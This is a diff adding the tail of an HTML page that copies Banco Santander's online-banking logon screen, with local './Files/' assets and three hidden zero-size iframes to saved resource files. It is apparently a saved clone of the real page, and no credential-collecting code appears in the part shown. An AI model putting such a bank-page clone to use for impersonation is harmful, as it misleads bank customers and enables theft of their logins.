+                                    <li><img src="./Files/FlechaDerecha.gif" alt=""><a target="_blank" class="opLogonStandardLink" href="https://cmc.bancosantander.es/ALTCMC_PHOENIX/public/inicio">Alta en Banca Online</a>
+                                        <div class="line"></div>
+                                    </li>
+                                    <li><img src="./Files/FlechaDerecha.gif" alt=""><a target="_blank" class="opLogonStandardLink" href="https://claves.bancosantander.es/bog/sbi?ptns=alis00">Su 1ª clave de acceso</a>
+                                        <div class="line"></div>
+                                    </li>
+                                    <li><img src="./Files/editIconos-TipoPDF.gif" alt=""><a target="_blank" class="opLogonStandardLink" href="https://www.bancosantander.es/cssa/ContentServer?c=SANDocument_C&amp;cid=1296828841605&amp;leng=es_ES&amp;pagename=WCSANComercLte%2FSANDocument_C%2FSANDocumentPreview">Instrucciones de acceso</a>
+                                        <div class="line"></div>
+                                    </li>
+                                    <li><img src="./Files/editIconos-TipoPDF.gif" alt=""><a target="_blank" class="opLogonStandardLink" href="https://www.bancosantander.es/cssa/ContentServer?c=SANDocument_C&amp;cid=1296828841672&amp;leng=es_ES&amp;pagename=WCSANComercLte%2FSANDocument_C%2FSANDocumentPreview">Preguntas Frecuentes DNIe</a>
+                                        <div class="line"></div>
+                                    </li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="shdwBtm">
+                        <div class="shdwBtmL"></div>
+                        <div class="shdwBtmR"></div>
+                    </div>
+                </div>
+                <div id="helpArea2" class="helpPrin">
+                    <div class="helpCont">
+                        <div class="helpArea"><span>Contacto</span>
+                            <div class="list">
+                                <ul>
+                                    <li><img src="./Files/GbContactoTelefonico.gif" alt=""><span>915 123 123</span>
+                                        <div class="line"></div>
+                                    </li>
+                                    <li><img src="./Files/iconoasistente.gif" alt=""><a class="opLogonStandardLink" href="javascript:Abrir_ventana(&#39;https://microsite.bancosantander.es/files/ayudaonline/popup/particulares.html&#39;)">Ayuda Online</a>
+                                        <div class="line"></div>
+                                    </li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="shdwBtm">
+                        <div class="shdwBtmL"></div>
+                        <div class="shdwBtmR"></div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+    <div class="opLogonFoot">
+
+        <div id="legalArea1" class="LegalArea">
+            <ul>
+                <li><a id="link1" target="_blank" class="opLogonStandardLink" href="https://www.bancosantander.es/es/accesibilidad">Accesibilidad</a>
+                </li>
+                <li><a id="link2" target="_blank" class="opLogonStandardLink" href="https://www.bancosantander.es/es/particulares/tu-dia-a-dia/seguridad-online/seguridad-online/aprende-seguridad-online/">Seguridad</a>
+                </li>
+                <li><a id="link3" target="_blank" class="opLogonStandardLink" href="https://www.bancosantander.es/es/tablon-de-anuncios">Tablón</a>
+                </li>
+                <li><a id="link4" target="_blank" class="opLogonStandardLink" href="https://www.bancosantander.es/es/espacio-mifid">MIFID</a>
+                </li>
+                <li class="last"><a id="link5" target="_blank" class="opLogonStandardLink" href="https://www.bancosantander.es/es/aviso-legal">Aviso Legal</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+
+
+
+
+
+    <iframe id="iframe213" frameborder="0" src="javascript: false;" title="xepbnd" style="width: 0px; height: 0px; border: none; display: none;" src="./Files/saved_resource.html"></iframe><iframe id="iframe165" frameborder="0" src="javascript: false;" title="lpxwwt" style="width: 0px; height: 0px; border: none; display: none;" src="./Files/saved_resource(1).html"></iframe><iframe id="iframe91" frameborder="0" src="javascript: false;" title="gcwlhn" style="width: 0px; height: 0px; border: none; display: none;" __idm_frm__="292" src="./Files/saved_resource(2).html"></iframe></body>
+
+</html>
